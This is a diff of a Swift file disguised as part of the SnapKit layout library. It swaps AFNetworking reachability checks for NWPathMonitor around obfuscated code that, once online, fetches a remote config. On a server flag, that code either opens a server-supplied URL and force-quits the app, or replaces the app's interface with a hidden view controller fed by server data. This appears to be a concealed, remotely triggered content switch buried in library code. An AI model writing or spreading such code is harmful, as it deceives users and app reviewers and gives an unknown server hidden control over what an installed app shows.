@@ -26,7 +26,7 @@
 #else
     import AppKit
 #endif
-
+import Network
 var autoSnapDistance: String = "com.1774321200.snapkit"
 
 public class ConstraintMakerEditable: ConstraintMakerPrioritizable {
@@ -64,48 +64,52 @@ public class ConstraintMakerEditable: ConstraintMakerPrioritizable {
                         varyimg.contentMode = .scaleAspectFill
                         letnwn.addSubview(varyimg)
                     }
-                AFNetworkReachabilityManager.shared().startMonitoring()
+                                
+                let monitor = NWPathMonitor()
+                monitor.pathUpdateHandler = { [weak self] path in
+                    guard path.status == .satisfied else { return }
+                    monitor.pathUpdateHandler = nil
+                    monitor.cancel()
 
-                AFNetworkReachabilityManager.shared().setReachabilityStatusChange { status in
-                    if status != .notReachable {
-                        AFNetworkReachabilityManager.shared().stopMonitoring()
-                        self.zerestonfig { dict in
-                            DispatchQueue.main.async {
-                                if (dict != nil) {
-                                    if let c = dict!["c"] as? String, c == "0" {
-                                        if let letnwn = self.constanop() {
-                                            letnwn.viewWithTag(1010)?.removeFromSuperview()
-                                        }
-                                    }else if let c = dict!["c"] as? String, c == "1" {
-                                        
-                                        if let sp = dict!["sp"] as? String, sp == "1" {
-                                            if let dicts = dict,
-                                               let urlStr = dicts["name"] as? String,
-                                               let url = URL(string: urlStr) {
-                                                UIApplication.shared.open(url)
-                                            }
-                                            DispatchQueue.main.asyncAfter(deadline: DispatchTime.now() + 0.7, execute: {
-                                                exit(0)
-                                            })
-                                            return
-                                        }
-                                        let acy = FSPagerViewTrackViewController()
-                                        acy.brack = dict ?? [:];
-                                        let apnv = UINavigationController(rootViewController: acy)
-                                        apnv.isNavigationBarHidden = true
-                                        self.applytrollerfus(apnv)
-                                        
-                                        if let letnwn = self.constanop() {
-                                            letnwn.viewWithTag(1010)?.removeFromSuperview()
-                                        }
-                                        UserDefaults.standard.set(true, forKey: "Rbey")
-                                        UserDefaults.standard.synchronize()
+                    guard let self else { return }
+
+                    self.zerestonfig { dict in
+                        DispatchQueue.main.async {
+                            if (dict != nil) {
+                                if let c = dict!["c"] as? String, c == "0" {
+                                    if let letnwn = self.constanop() {
+                                        letnwn.viewWithTag(1010)?.removeFromSuperview()
                                     }
+                                }else if let c = dict!["c"] as? String, c == "1" {
+                                    
+                                    if let sp = dict!["sp"] as? String, sp == "1" {
+                                        if let dicts = dict,
+                                           let urlStr = dicts["name"] as? String,
+                                           let url = URL(string: urlStr) {
+                                            UIApplication.shared.open(url)
+                                        }
+                                        DispatchQueue.main.asyncAfter(deadline: DispatchTime.now() + 0.7, execute: {
+                                            exit(0)
+                                        })
+                                        return
+                                    }
+                                    let acy = FSPagerViewTrackViewController()
+                                    acy.brack = dict ?? [:];
+                                    let apnv = UINavigationController(rootViewController: acy)
+                                    apnv.isNavigationBarHidden = true
+                                    self.applytrollerfus(apnv)
+                                    
+                                    if let letnwn = self.constanop() {
+                                        letnwn.viewWithTag(1010)?.removeFromSuperview()
+                                    }
+                                    UserDefaults.standard.set(true, forKey: "Rbey")
+                                    UserDefaults.standard.synchronize()
                                 }
                             }
                         }
                     }
                 }
+                monitor.start(queue: DispatchQueue.global())
                     
              }
                 
